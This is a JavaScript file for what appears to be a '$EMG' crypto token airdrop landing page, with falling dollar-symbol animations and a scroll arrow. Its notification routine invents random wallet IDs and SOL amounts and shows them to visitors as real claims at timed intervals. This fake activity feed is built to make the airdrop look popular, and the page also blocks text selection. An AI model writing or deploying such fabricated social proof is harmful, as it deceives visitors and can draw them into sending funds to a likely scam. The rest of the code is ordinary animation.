// Dollar particles animation
const canvas = document.getElementById('bg-canvas');
const ctx = canvas.getContext('2d');
let dollars = [];
let mouseX = 0;
let mouseY = 0;

// Dollar symbols array (mix of $ and EMG)
const symbols = ['$', '$EMG'];

// Preload dollar image
const dollarImage = new Image();
dollarImage.src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTEyLDJBMTAsMTAgMCAwLDEgMjIsMTJBMTAsMTAgMCAwLDEgMTIsMjJBMTAsMTAgMCAwLDEgMiwxMkExMCwxMCAwIDAsMSAxMiwyTTEyLDRBOCw4IDAgMCwwIDQsMTJBOCw4IDAgMCwwIDEyLDIwQTgsOCAwIDAsMCAyMCwxMkE4LDggMCAwLDAgMTIsNE0xMSw3SDEzVjlIMTVWMTFIMTNWMTNIMTVWMTVIMTNWMTdIMTFWMTVIOVYxM0gxMVYxMUg5VjlIMTFWN1oiLz48L3N2Zz4=';

function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
}

class Dollar {
    constructor() {
        this.size = Math.random() * 20 + 10; // Size between 10 and 30
        this.initialX = Math.random() * canvas.width;
        this.x = this.initialX;
        this.y = Math.random() * -100; // Start above the screen
        this.time = Math.random() * 100;
        this.rotationSpeed = (Math.random() - 0.5) * 0.1;
        this.rotation = Math.random() * Math.PI * 2;
        this.symbol = symbols[Math.floor(Math.random() * symbols.length)];
        this.isText = Math.random() > 0.5;
        this.speed = Math.random() * 2 + 1;
        this.oscillationSpeed = Math.random() * 0.02;
        this.oscillationDistance = Math.random() * 30;
    }

    reset() {
        this.x = Math.random() * canvas.width;
        this.y = -50;
        this.time = Math.random() * 100;
    }

    update() {
        this.time += this.oscillationSpeed;
        this.rotation += this.rotationSpeed;
        
        // Oscillate horizontally
        this.x = this.initialX + Math.sin(this.time) * this.oscillationDistance;
        
        // Move away from mouse when nearby
        const dx = mouseX - this.x;
        const dy = mouseY - this.y;
        const distance = Math.sqrt(dx * dx + dy * dy);
        
        if (distance < 100) {
            const angle = Math.atan2(dy, dx);
            this.x -= Math.cos(angle) * 3; // Reduced from 5
            this.y -= Math.sin(angle) * 3; // Reduced from 5
        }

        this.y += this.speed;

        if (this.y > canvas.height + 50) {
            this.reset();
        }
    }

    draw() {
        ctx.save();
        ctx.translate(this.x, this.y);
        ctx.rotate(this.rotation);
        
        if (this.isText) {
            // Increase opacity for better visibility with shorter trails
            ctx.fillStyle = 'rgba(255, 255, 255, 0.95)';
            ctx.font = `bold ${this.size}px Arial`;
            ctx.textAlign = 'center';
            ctx.textBaseline = 'middle';
            
            // Optimize shadow rendering
            ctx.shadowColor = 'white';
            ctx.shadowBlur = 5; // Reduced from 10 for better performance
            ctx.fillText(this.symbol, 0, 0);
        } else {
            ctx.globalAlpha = 0.95; // Increased from 0.9
            ctx.drawImage(dollarImage, -this.size/2, -this.size/2, this.size, this.size);
        }
        
        ctx.restore();
    }
}

function init() {
    dollars = [];
    // Significantly reduce the number of particles
    for (let i = 0; i < 25; i++) { // Changed from 75 to 25
        dollars.push(new Dollar());
    }
}

// Add performance optimization
let lastTime = 0;
const fps = 60;
const frameInterval = 1000 / fps;

function animateWithFpsLimit(currentTime) {
    if (!lastTime) lastTime = currentTime;
    const deltaTime = currentTime - lastTime;

    if (deltaTime >= frameInterval) {
        // Increase opacity to reduce trail length
        ctx.fillStyle = 'rgba(0, 0, 0, 0.8)'; // Changed from 0.6 to 0.8
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        dollars.forEach(dollar => {
            dollar.update();
            dollar.draw();
        });

        lastTime = currentTime - (deltaTime % frameInterval);
    }

    requestAnimationFrame(animateWithFpsLimit);
}

// Notifications system
function createNotification() {
    const container = document.querySelector('.notifications-container');
    const notification = document.createElement('div');
    notification.className = 'notification';
    
    const wallet = Array.from({length: 6}, () => 
        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[
            Math.floor(Math.random() * 62)
        ]
    ).join('');
    
    const amount = (Math.random() * 4.5 + 0.5).toFixed(2);
    
    notification.innerHTML = `
        <span class="wallet">${wallet}</span>
        <span> has claimed </span>
        <span class="amount">${amount} SOL</span>
        <span> worth of $EMG</span>
    `;
    
    container.appendChild(notification);
    
    setTimeout(() => {
        notification.remove();
    }, 5000);
}

function scheduleNextNotification() {
    const delay = Math.random() * 10000 + 15000; // 15-25 seconds
    setTimeout(() => {
        createNotification();
        scheduleNextNotification();
    }, delay);
}

// Scroll arrow
const scrollArrow = document.querySelector('.scroll-arrow');
const airdropSection = document.getElementById('airdrop');

function toggleScrollArrow() {
    if (window.scrollY < 100) {
        scrollArrow.classList.add('visible');
    } else {
        scrollArrow.classList.remove('visible');
    }
}

scrollArrow.addEventListener('click', () => {
    airdropSection.scrollIntoView({ behavior: 'smooth' });
});

// Event listeners
window.addEventListener('mousemove', (e) => {
    mouseX = e.clientX;
    mouseY = e.clientY;
});

window.addEventListener('resize', resizeCanvas);
window.addEventListener('scroll', toggleScrollArrow);

// Prevent dragging and copying
document.addEventListener('dragstart', (e) => e.preventDefault());
document.addEventListener('selectstart', (e) => {
    if (!e.target.matches('input, textarea')) {
        e.preventDefault();
    }
});

// Make sure canvas is properly initialized
window.addEventListener('load', () => {
    resizeCanvas();
    init();
    requestAnimationFrame(animateWithFpsLimit);
    scheduleNextNotification();
    toggleScrollArrow();
}); 
